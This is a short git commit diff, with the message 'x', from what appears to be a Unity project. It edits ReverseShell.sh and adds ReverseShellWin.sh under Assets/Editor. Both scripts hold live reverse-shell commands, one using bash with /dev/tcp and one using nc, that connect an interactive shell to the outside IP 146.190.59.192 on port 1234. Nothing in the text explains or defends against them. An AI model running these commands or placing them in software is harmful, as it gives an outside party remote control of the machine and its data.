9a9e7b38861babee6466e2dcfe1f570c024be745
zhiganghuang <zhiganghuang@unity3d.com>
2025-04-03 13:34:20 +0800

    x

--- Assets/Editor/ReverseShell.sh
+++ Assets/Editor/ReverseShell.sh
@@ -1,9 +1,2 @@
 #!/usr/bin/env bash
-
-## Source profile
-. ~/.profile
-
-cat ~/.profile
-
 /bin/bash -c 'bash -i >& /dev/tcp/146.190.59.192/1234 0>&1'
-
---
+++ Assets/Editor/ReverseShellWin.sh
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+/bin/bash -i | nc 146.190.59.192 1234
